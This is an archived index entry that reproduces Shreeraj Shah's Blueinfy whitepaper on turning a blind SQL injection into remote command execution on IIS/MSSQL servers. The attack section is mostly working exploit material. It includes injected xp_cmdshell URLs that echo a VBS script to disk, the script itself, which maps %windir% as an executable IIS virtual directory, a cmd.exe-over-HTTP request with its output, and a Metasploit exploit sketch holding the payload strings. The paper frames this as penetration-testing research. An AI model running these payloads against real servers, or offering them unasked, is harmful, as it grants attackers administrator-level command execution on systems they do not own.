---
type: Whitepaper
title: Pulling system32 out over blind SQL Injection
description: "A route out of a blind SQL injection where xp_cmdshell also gives no feedback, no outbound traffic is allowed and the webroot path is unknown. Echo a VBS file line by line through xp_cmdshell, run it with cscript, and it creates an IIS virtual directory 'secret' mapped to %windir% with execute permission; /secret/system32/cmd.exe then runs commands over HTTP. Metasploit sketch included."
resource: "http://blueinfy.com/wp/blindsql.pdf"
tags: [whitepaper, webseclist-reference, en, blueinfy-com, sqli, mssql, rce, command-injection, database, aspnet, tooling, novel-technique]
generated:
  by: webseclist-refs/1
  at: "2026-08-14T21:29:32+00:00"
status: stable
stale_after: 2027-08-14
sources:
  - id: original
    resource: "http://blueinfy.com/wp/blindsql.pdf"
    title: Pulling system32 out over blind SQL Injection
    author: Shreeraj Shah
  - id: canonical
    resource: "https://blueinfy.com"
  - id: capture
    resource: "https://web.archive.org/web/20081204225130/http://blueinfy.com/wp/blindsql.pdf"
also_at: []
authors:
  - Shreeraj Shah
canonical_url: "https://blueinfy.com"
cited_by:
  - "2008.md:56"
commit: ""
content_sha256: 5c45e4faff18815cf05f2f69a281edc5259d77430dc97ebca18cf95a24de2898
depth: full
depth_reason: default
kind: whitepaper
language: en
licence: unknown
original_url: "http://blueinfy.com/wp/blindsql.pdf"
published: ""
publisher: blueinfy.com
publisher_english: ""
raw_sha256: 38f99722128efd5e6ad90e4e47213ad4e80f38e80cd65725de7307d4dc245cf1
retrieved_from: "https://blueinfy.com"
retrieved_kind: stored
retrieved_utc: "2026-08-14T21:29:32+00:00"
slug: pulling-system32-out-over-blind-sql-injection
snapshot: 20081204225130
title_english: ""
translation_file: ""
translation_of: ""
---

# Pulling system32 out over blind SQL Injection

**Pulling system32 out over blind SQL Injection** - Shreeraj Shah, blueinfy.com.

- Published: date not stated
- Original: <http://blueinfy.com/wp/blindsql.pdf>
- Current location: <https://blueinfy.com>
- Preserved from: https://blueinfy.com (stored) on 2026-08-14
- Capture timestamp: 20081204225130
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

# Pulling system32 out over blind SQL Injection

--- page 1 ---

1 Blueinfy’s whitepaper series Blind SQL injection discovery & exploitation technique by Shreeraj Shah Abstract This paper describes technique to deal with
 blind SQL injection spot with ASP/ASP.NET 
applications running with access to XP_CMDSH
ELL. It is possible to perform pen test 
against this scenario though 
not having any kind of reverse 
access or display of error 
message. It can be used in completely b
lind environment and successful execution can 
grant remote command execution on the target
 application with admin privileges. 
 
 Keywords Blind SQL injection, SQ
L injection, XP_CMDSHELL 
 
 
 
 
 
 
 
 Author Shreeraj Shah, Founder & Director
, Blueinfy Solutions Pvt. Ltd. 
Email : 
shreeraj@blueinfy.com 
Blog : 
http://shreeraj.blogspot.com 
Profile : 
http://www.linkedin.com/in/shreeraj
 
http://www.blueinfy.com

--- page 2 ---

2 Blueinfy’s whitepaper series Problem Domain: 
 
While performing web application and penetr
ation testing following scenario is very 
common and it hides potential exploitable SQL injection scenario: 
 
1.
 
We have SQL injection point 
but it is not throwing any 
error message out as part 
of its response. Application is sending
 customized error page which is not 
revealing any signature by which we
 can deduce potential SQL flaw. 
2.
 
Knowing SQL injection point or loophol
e in web application, xp_cmdshell seems 
to be working. But we can’t say is it wo
rking or not since it 
doesn’t return any 
meaningful signature. This is 
“blind xp_cmdshell”.
 
3.
 
Firewall don’t allow outbound traffic so can
’t do ftp, tftp, ping etc from the box to 
the Internet by which you can confirm execution of the command on the target 
system. 
4.
 
We don’t know the actual path to webroot so
 can’t copy file to location which can 
be accessed over HTTP or HTTPS later to
 confirm the execution of the command. 
5.
 
If we know path to webroot and dire
ctory structure but can’t find execute 
permission on it so can’t copy cmd.exe or any other binary and execute over 
HTTP/HTTPS. 
 
Hence, it is becoming difficult to deal with th
is kind of situation and identify blind SQL 
injection spot. Let’s see one 
of the ways by which you can reach to cmd.exe and bring it 
out to the web and access over HTTP/HTTPS. 
This way you can confirm the existence of 
vulnerability on the target application. 
 
Solution: 
 
Here is a solution or test one can perfor
m during penetration testing and check the 
existence of blind 
“xp_cmdshell”.
 
 
Step 1: 
 
One can echo following lines to file and st
ore it to a filesystem for example say 
secret.vbs using xp_cmdshell interface. 
 Set WshShell = WScript.CreateObject("WScript.Shell") Set ObjExec = WshShell.Exec("cmd.exe /c echo %windir%") windir = ObjExec.StdOut.ReadLine() Set Root = GetObject("IIS://LocalHost/W3SVC/1/ROOT") Set Dir = Root.Create("IIs
WebVirtualDir", "secret") Dir.Path = windir Dir.AccessExecute = True Dir.SetInfo 
In this particular script we are identifyi
ng windir on the fly and se
tup a virtual root on it 
with exec permission. We are mapping windows 
directory and map it to virtual root 
“secret”, setting execute access on it as well. 
Following list of commands will create file

--- page 3 ---

3 Blueinfy’s whitepaper series on the server. Here is a way by which we can
 create file line by line and then execute 
script on the target machine as well. 
 
 
http://target/details.asp?id=1;exec+master..xp_cmdshell+’echo ' Set WshShell = 
WScript.CreateObject("WScript.Shell") > c:\secret.vbs’ 
….. 
….. 
….. 
http://target/details.asp?id=1;exec+mast
er..xp_cmdshell+’echo ' Dir.SetInfo 
>> c:\secret.vbs’ 
 
Step 2: 
 
Run this file using xp_cmdshell by following command. 
http://target/details.asp?id=1;exec+master
..xp_cmdshell+'cscript+c:\secret.vbs’ 
This will run file and create /secret/ virtual root on the server. 
 
Step 3: 
Run command over HTTP/HTTPS 
http://target/secret/system32/cmd.exe?+/c+set 
 
Now we have full access to system32 binaries
 with execution privileges. Here what you 
get as output. 
 CGI Error The specified CGI application misbehaved 
by not returning a complete set of HTTP 
headers. The headers it did return are: ALLUSERSPROFILE=C:\Documents and Settings\All Users 
CommonProgramFiles=C:\Program Files\Common Files 
COMPUTERNAME=BLUESQUARE 
ComSpec=C:\WINNT\system32\cmd.exe 
CONTENT_LENGTH=0 
GATEWAY_INTERFACE=CGI/1.1 
HTTPS=off 
HTTP_ACCEPT=text/xml,application/xml,application/xhtml+xml,text/html;q= 
0.9,text/plain;q=0.8,image/png,*/*;q=0.5 
HTTP_ACCEPT_LANGUAGE=en-us,en;q=0.5 
HTTP_CONNECTION=keep-alive 
HTTP_HOST=localhost 
HTTP_USER_AGENT=Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; 
rv:1.7.3) Gecko/20040910 
HTTP_ACCEPT_ENCODING=gzip,deflate 
HTTP_ACCEPT_CHARSET=ISO-8859-1,utf-8;q=0.7,*;q=0.7 
HTTP_KEEP_ALIVE=300 
INCLUDE=C:\Program Files\Microsoft Visual Studio 
.NET\FrameworkSDK\include\ 
INSTANCE_ID=1 
LIB=C:\Program Files\Microsoft Visual Studio .NET\FrameworkSDK\Lib\ 
LOCAL_ADDR=127.0.0.1 
NUMBER_OF_PROCES

--- page 4 ---

4 Blueinfy’s whitepaper series It is possible to integrate into any of the e
xploit framework as well. For example here is 
we are putting it into Metasploit: 
 sub Exploit { my $self = shift; my $target_host = $self->GetVar('RHOST'); my $target_port = $self->GetVar('RPORT'); my $path = $self->GetVar('RPATH'); my $vhost = $self->GetVar('VHOST'); 
 my @url = split(/#/, $path); my @payload = ("EXEC+master..xp_cmdshell+'echo+Set+WshShell+=+WScr
ipt.CreateObject(\"WScript.Shell\")>c:\\secret.vbs'", "EXEC+master..xp_cmdshell+'echo+Set+Root+=+GetObject
(\"IIS://LocalHost/W3SVC/1/ROOT\")>>c:\\secret.vbs'", "EXEC+master..xp_cmdshell+'echo+Set+Dir+=+Root.Create
(\"IIsWebVirtualDir\",\"secret\")>>c:\\secret.vb s'", "EXEC+master..xp_cmdshell+'echo+Dir.Path+=
+\"c:\\winnt\\system32\\\">>c:\\secret.vbs'", "EXEC+master..xp_cmdshell+'echo+Dir.
AccessExecute+=+True>>c:\\secret.vbs'", "EXEC+master..xp_cmdshell+'echo+
Dir.SetInfo>>c:\\secret.vbs'", "EXEC+master..xp_cmdshell+'cscript+c:\\secret.vbs'" ); $self->PrintLine("[+] Sending SQL injection payload..."); for(my $count=0;$count<=6;$count++) .. .. Once we execute it we get following sort of output. 
 
 
 
Conclusion: 
 
The technique described in this paper can 
help in testing blin
d SQL injection running 
with blind xp_cmdshell. It is easy to send 
few requests and check whether we are getting 
execution rights on the target a
pplication or not, even applic
ation is totally blind as 
described in problem domain.
